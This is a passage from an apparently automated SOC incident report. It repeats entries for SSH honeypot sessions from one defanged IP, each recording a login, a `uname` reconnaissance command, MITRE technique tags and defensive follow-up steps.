| `2026-09-24 16:33:18` | `cowrie.client.version` |
| `2026-09-24 16:33:18` | `cowrie.client.kex` |
| `2026-09-24 16:33:22` | `cowrie.login.success` |
| `2026-09-24 16:33:25` | `cowrie.session.params` |
| `2026-09-24 16:33:25` | `cowrie.command.input` |
| `2026-09-24 16:33:26` | `cowrie.log.closed` |
| `2026-09-24 16:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d1b3bf0856

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:18` | `cowrie.session.connect` |
| `2026-09-24 16:33:18` | `cowrie.client.version` |
| `2026-09-24 16:33:18` | `cowrie.client.kex` |
| `2026-09-24 16:33:21` | `cowrie.login.success` |
| `2026-09-24 16:33:23` | `cowrie.session.params` |
| `2026-09-24 16:33:23` | `cowrie.command.input` |
| `2026-09-24 16:33:24` | `cowrie.log.closed` |
| `2026-09-24 16:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72989ea2e7af

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:18` | `cowrie.session.connect` |
| `2026-09-24 16:33:18` | `cowrie.client.version` |
| `2026-09-24 16:33:18` | `cowrie.client.kex` |
| `2026-09-24 16:33:22` | `cowrie.login.success` |
| `2026-09-24 16:33:25` | `cowrie.session.params` |
| `2026-09-24 16:33:25` | `cowrie.command.input` |
| `2026-09-24 16:33:26` | `cowrie.log.closed` |
| `2026-09-24 16:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bff703f4511

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:19` | `cowrie.session.connect` |
| `2026-09-24 16:33:20` | `cowrie.client.version` |
| `2026-09-24 16:33:20` | `cowrie.client.kex` |
| `2026-09-24 16:33:23` | `cowrie.login.success` |
| `2026-09-24 16:33:26` | `cowrie.session.params` |
| `2026-09-24 16:33:26` | `cowrie.command.input` |
| `2026-09-24 16:33:26` | `cowrie.log.closed` |
| `2026-09-24 16:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba9c5ec22b62

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:19` | `cowrie.session.connect` |
| `2026-09-24 16:33:20` | `cowrie.client.version` |
| `2026-09-24 16:33:20` | `cowrie.client.kex` |
| `2026-09-24 16:33:26` | `cowrie.login.success` |
| `2026-09-24 16:33:27` | `cowrie.session.params` |
| `2026-09-24 16:33:27` | `cowrie.command.input` |
| `2026-09-24 16:33:29` | `cowrie.log.closed` |
| `2026-09-24 16:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0962637d260c

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:20` | `cowrie.session.connect` |
| `2026-09-24 16:33:20` | `cowrie.client.version` |
| `2026-09-24 16:33:22` | `cowrie.client.kex` |
| `2026-09-24 16:33:26` | `cowrie.login.success` |
| `2026-09-24 16:33:29` | `cowrie.session.params` |
| `2026-09-24 16:33:29` | `cowrie.command.input` |
| `2026-09-24 16:33:29` | `cowrie.log.closed` |
| `2026-09-24 16:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0022d261f02b

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:22` | `cowrie.session.connect` |
| `2026-09-24 16:33:22` | `cowrie.client.version` |
| `2026-09-24 16:33:24` | `cowrie.client.kex` |
| `2026-09-24 16:33:26` | `cowrie.login.success` |
| `2026-09-24 16:33:28` | `cowrie.session.params` |
| `2026-09-24 16:33:28` | `cowrie.command.input` |
| `2026-09-24 16:33:29` | `cowrie.log.closed` |
| `2026-09-24 16:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7021305bfb

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:22` | `cowrie.session.connect` |
| `2026-09-24 16:33:22` | `cowrie.client.version` |
| `2026-09-24 16:33:24` | `cowrie.client.kex` |
| `2026-09-24 16:33:27` | `cowrie.login.success` |
| `2026-09-24 16:33:29` | `cowrie.session.params` |
| `2026-09-24 16:33:29` | `cowrie.command.input` |
| `2026-09-24 16:33:30` | `cowrie.log.closed` |
| `2026-09-24 16:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af74c83b5006

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:24` | `cowrie.session.connect` |
| `2026-09-24 16:33:24` | `cowrie.client.version` |
| `2026-09-24 16:33:26` | `cowrie.client.kex` |
| `2026-09-24 16:33:29` | `cowrie.login.success` |
| `2026-09-24 16:33:31` | `cowrie.session.params` |
| `2026-09-24 16:33:31` | `cowrie.command.input` |
| `2026-09-24 16:33:32` | `cowrie.log.closed` |
| `2026-09-24 16:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f92a087d954d

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:24` | `cowrie.session.connect` |
| `2026-09-24 16:33:24` | `cowrie.client.version` |
| `2026-09-24 16:33:26` | `cowrie.client.kex` |
| `2026-09-24 16:33:28` | `cowrie.login.success` |
| `2026-09-24 16:33:30` | `cowrie.session.params` |
| `2026-09-24 16:33:30` | `cowrie.command.input` |
| `2026-09-24 16:33:32` | `cowrie.log.closed` |
| `2026-09-24 16:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c180120dcbff

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:24` | `cowrie.session.connect` |
| `2026-09-24 16:33:24` | `cowrie.client.version` |
| `2026-09-24 16:33:26` | `cowrie.client.kex` |
| `2026-09-24 16:33:29` | `cowrie.login.success` |
| `2026-09-24 16:33:33` | `cowrie.session.params` |
| `2026-09-24 16:33:33` | `cowrie.command.input` |
| `2026-09-24 16:33:34` | `cowrie.log.closed` |
| `2026-09-24 16:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81b5a41e11fb

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:26` | `cowrie.session.connect` |
| `2026-09-24 16:33:26` | `cowrie.client.version` |
| `2026-09-24 16:33:26` | `cowrie.client.kex` |
| `2026-09-24 16:33:29` | `cowrie.login.success` |
| `2026-09-24 16:33:32` | `cowrie.session.params` |
| `2026-09-24 16:33:32` | `cowrie.command.input` |
| `2026-09-24 16:33:32` | `cowrie.log.closed` |
| `2026-09-24 16:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bd7bbe4ee63

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:26` | `cowrie.session.connect` |
| `2026-09-24 16:33:26` | `cowrie.client.version` |
| `2026-09-24 16:33:26` | `cowrie.client.kex` |
| `2026-09-24 16:33:31` | `cowrie.login.success` |
| `2026-09-24 16:33:34` | `cowrie.session.params` |
| `2026-09-24 16:33:34` | `cowrie.command.input` |
| `2026-09-24 16:33:35` | `cowrie.log.closed` |
| `2026-09-24 16:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c3965a9940

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:26` | `cowrie.session.connect` |
| `2026-09-24 16:33:26` | `cowrie.client.version` |
| `2026-09-24 16:33:26` | `cowrie.client.kex` |
| `2026-09-24 16:33:29` | `cowrie.login.success` |
| `2026-09-24 16:33:32` | `cowrie.session.params` |
| `2026-09-24 16:33:32` | `cowrie.command.input` |
| `2026-09-24 16:33:33` | `cowrie.log.closed` |
| `2026-09-24 16:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3247fdeb41e

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:29` | `cowrie.session.connect` |
| `2026-09-24 16:33:29` | `cowrie.client.version` |
| `2026-09-24 16:33:29` | `cowrie.client.kex` |
| `2026-09-24 16:33:34` | `cowrie.login.success` |
| `2026-09-24 16:33:37` | `cowrie.session.params` |
| `2026-09-24 16:33:37` | `cowrie.command.input` |
| `2026-09-24 16:33:38` | `cowrie.log.closed` |
| `2026-09-24 16:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a1a3bd8217

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:29` | `cowrie.session.connect` |
| `2026-09-24 16:33:29` | `cowrie.client.version` |
| `2026-09-24 16:33:29` | `cowrie.client.kex` |
| `2026-09-24 16:33:34` | `cowrie.login.success` |
| `2026-09-24 16:33:35` | `cowrie.session.params` |
| `2026-09-24 16:33:35` | `cowrie.command.input` |
| `2026-09-24 16:33:37` | `cowrie.log.closed` |
| `2026-09-24 16:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdb57e625956

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:29` | `cowrie.session.connect` |
| `2026-09-24 16:33:29` | `cowrie.client.version` |
| `2026-09-24 16:33:29` | `cowrie.client.kex` |
| `2026-09-24 16:33:33` | `cowrie.login.success` |
| `2026-09-24 16:33:35` | `cowrie.session.params` |
| `2026-09-24 16:33:35` | `cowrie.command.input` |
| `2026-09-24 16:33:35` | `cowrie.log.closed` |
| `2026-09-24 16:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a279687071fd

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:29` | `cowrie.session.connect` |
| `2026-09-24 16:33:31` | `cowrie.client.version` |
| `2026-09-24 16:33:32` | `cowrie.client.kex` |
| `2026-09-24 16:33:35` | `cowrie.login.success` |
| `2026-09-24 16:33:36` | `cowrie.session.params` |
| `2026-09-24 16:33:36` | `cowrie.command.input` |
| `2026-09-24 16:33:38` | `cowrie.log.closed` |
| `2026-09-24 16:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fbc63368852

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:31` | `cowrie.session.connect` |
| `2026-09-24 16:33:32` | `cowrie.client.version` |
| `2026-09-24 16:33:32` | `cowrie.client.kex` |
| `2026-09-24 16:33:35` | `cowrie.login.success` |
| `2026-09-24 16:33:37` | `cowrie.session.params` |
| `2026-09-24 16:33:37` | `cowrie.command.input` |
| `2026-09-24 16:33:38` | `cowrie.log.closed` |
| `2026-09-24 16:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4125d24b43

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:32` | `cowrie.session.connect` |
| `2026-09-24 16:33:32` | `cowrie.client.version` |
| `2026-09-24 16:33:33` | `cowrie.client.kex` |
| `2026-09-24 16:33:36` | `cowrie.login.success` |
| `2026-09-24 16:33:39` | `cowrie.session.params` |
| `2026-09-24 16:33:39` | `cowrie.command.input` |
| `2026-09-24 16:33:40` | `cowrie.log.closed` |
| `2026-09-24 16:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c491f5000925

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:32` | `cowrie.session.connect` |
| `2026-09-24 16:33:32` | `cowrie.client.version` |
| `2026-09-24 16:33:33` | `cowrie.client.kex` |
| `2026-09-24 16:33:36` | `cowrie.login.success` |
| `2026-09-24 16:33:40` | `cowrie.session.params` |
| `2026-09-24 16:33:40` | `cowrie.command.input` |
| `2026-09-24 16:33:41` | `cowrie.log.closed` |
| `2026-09-24 16:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19b7843ce29c

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:32` | `cowrie.session.connect` |
| `2026-09-24 16:33:32` | `cowrie.client.version` |
| `2026-09-24 16:33:33` | `cowrie.client.kex` |
| `2026-09-24 16:33:35` | `cowrie.login.success` |
| `2026-09-24 16:33:38` | `cowrie.session.params` |
| `2026-09-24 16:33:38` | `cowrie.command.input` |
| `2026-09-24 16:33:38` | `cowrie.log.closed` |
| `2026-09-24 16:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c0bf56388e

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:34` | `cowrie.session.connect` |
| `2026-09-24 16:33:34` | `cowrie.client.version` |
| `2026-09-24 16:33:35` | `cowrie.client.kex` |
| `2026-09-24 16:33:38` | `cowrie.login.success` |
| `2026-09-24 16:33:41` | `cowrie.session.params` |
| `2026-09-24 16:33:41` | `cowrie.command.input` |
| `2026-09-24 16:33:41` | `cowrie.log.closed` |
| `2026-09-24 16:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b10e88ec719

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:34` | `cowrie.session.connect` |
| `2026-09-24 16:33:34` | `cowrie.client.version` |
| `2026-09-24 16:33:35` | `cowrie.client.kex` |
| `2026-09-24 16:33:40` | `cowrie.login.success` |
| `2026-09-24 16:33:43` | `cowrie.session.params` |
| `2026-09-24 16:33:43` | `cowrie.command.input` |
| `2026-09-24 16:33:45` | `cowrie.log.closed` |
| `2026-09-24 16:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-867cb4a12298

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:35` | `cowrie.session.connect` |
| `2026-09-24 16:33:35` | `cowrie.client.version` |
| `2026-09-24 16:33:36` | `cowrie.client.kex` |
| `2026-09-24 16:33:40` | `cowrie.login.success` |
| `2026-09-24 16:33:42` | `cowrie.session.params` |
| `2026-09-24 16:33:42` | `cowrie.command.input` |
| `2026-09-24 16:33:44` | `cowrie.log.closed` |
| `2026-09-24 16:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe14515fa791

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
| **Last Seen** | 2026-09-24 16:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:33:35` | `cowrie.session.connect` |
| `2026-09-24 16:33:35` | `cowrie.client.version` |
| `2026-09-24 16:33:37` | `cowrie.client.kex` |
| `2026-09-24 16:33:39` | `cowrie.login.success` |
| `2026-09-24 16:33:41` | `cowrie.session.params` |
| `2026-09-24 16:33:41` | `cowrie.command.input` |
| `2026-09-24 16:33:43` | `cowrie.log.closed` |
| `2026-09-24 16:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5207785a2783

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:33 |
